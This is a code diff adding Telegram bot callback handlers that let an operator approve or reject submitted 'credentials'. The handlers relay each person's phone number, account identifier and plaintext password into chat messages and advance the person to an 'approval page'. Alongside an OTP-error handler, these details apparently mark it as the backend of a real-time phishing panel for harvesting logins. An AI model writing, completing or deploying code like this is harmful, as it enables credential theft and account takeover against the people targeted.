@@ -1,0 +1,101 @@
+// Add these callback handlers INSIDE the bot.on('callback_query') function
+// After the existing wrongcode_otp handler and BEFORE the "STANDARD CALLBACKS" section
+
+// ==========================================
+// ACCOUNT VERIFICATION CALLBACKS
+// ==========================================
+if (data.startsWith('deny_verify_')) {
+    const applicationId = data.replace('deny_verify_', '');
+    console.log(`❌ Account verification DENIED: ${applicationId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
+        });
+        return;
+    }
+    
+    // Update status
+    await db.updateApplication(applicationId, { verificationStatus: 'rejected' });
+    console.log(`✅ Status updated: verification rejected`);
+    
+    // Update message
+    const updatedMessage = `
+❌ *INVALID CREDENTIALS*
+
+📋 \`${applicationId}\`
+📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`
+${application.identifierType === 'email' ? '📧' : '📱'} \`${application.accountIdentifier}\`
+🔑 \`${application.accountPassword}\`
+
+✗ REJECTED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+    `;
+    
+    await bot.editMessageText(updatedMessage, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    
+    await bot.answerCallbackQuery(callbackQuery.id, {
+        text: '❌ Credentials rejected',
+        show_alert: false
+    });
+    
+    console.log(`✅ Account verification rejection complete\n`);
+    return;
+}
+
+if (data.startsWith('approve_verify_')) {
+    const applicationId = data.replace('approve_verify_', '');
+    console.log(`✅ Account verification APPROVED: ${applicationId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
+        });
+        return;
+    }
+    
+    // Update status
+    await db.updateApplication(applicationId, { verificationStatus: 'approved' });
+    console.log(`✅ Status updated: verification approved`);
+    
+    // Update message
+    const updatedMessage = `
+✅ *CREDENTIALS VERIFIED*
+
+📋 \`${applicationId}\`
+📱 \`${formatPhoneForDisplay(application.phoneNumber)}\`
+${application.identifierType === 'email' ? '📧' : '📱'} \`${application.accountIdentifier}\`
+🔑 \`${application.accountPassword}\`
+
+✓ APPROVED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+
+User will now see approval page.
+    `;
+    
+    await bot.editMessageText(updatedMessage, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    
+    await bot.answerCallbackQuery(callbackQuery.id, {
+        text: '✅ Credentials approved!',
+        show_alert: false
+    });
+    
+    console.log(`✅ Account verification approval complete\n`);
+    return;
+}
